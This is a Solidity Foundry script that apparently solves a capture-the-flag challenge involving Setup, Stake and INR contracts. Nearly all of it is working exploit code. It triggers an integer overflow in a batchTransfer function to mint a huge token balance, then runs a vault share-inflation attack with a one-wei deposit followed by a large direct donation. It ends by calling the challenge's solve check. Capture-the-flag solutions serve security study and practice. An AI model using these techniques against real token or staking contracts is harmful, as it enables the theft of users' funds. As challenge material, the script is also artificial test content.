//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Script,console} from "forge-std/Script.sol";
import {Setup,Stake,INR} from "src/Setup.sol";
import "forge-std/StdJson.sol"; 

contract solve is Script{
     using stdJson for *;
    function run()public{
        Setup setup;
        Stake stake;
        INR inr;
        string memory Setup_path=string.concat("broadcast/DeploySetup.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        try vm.readFile(Setup_path){
            string memory json = vm.readFile(Setup_path);
            address deployed = json.readAddress(".transactions[0].contractAddress");
            setup=Setup(deployed);
            stake=setup.stake();
            inr=setup.inr();
        }catch{
            revert("Chall Not Yet Deployed");
        }
        vm.startBroadcast();
        ExploitInflation exploit=new ExploitInflation(setup);
        exploit.Exploit();
        vm.stopBroadcast();

    }
}   


contract ExploitInflation{
    Stake stake;
    INR inr;
    Setup setup;

    constructor(Setup _setup){
        setup=_setup;
        inr=setup.inr();
        stake=setup.stake();
    }

    function Exploit()public{
        setup.claim();
        uint256 stakeAmount=1;
        uint256 inflationAmount=50_000 ether;
        address[] memory Receivers=new address[](2);
        Receivers[0]=address(this);
        Receivers[1]=address(0);
        uint256 amount=((type(uint256).max)/2)+1;
        inr.batchTransfer(Receivers, amount);
        inr.approve(address(stake), stakeAmount);
        stake.deposit(stakeAmount, address(this));
        inr.transfer(address(stake), inflationAmount);
        setup.stakeINR();
        setup.solve();
        require(setup.isSolved(),"Exploit Failed");
        console.log(setup.isSolved());
    }
}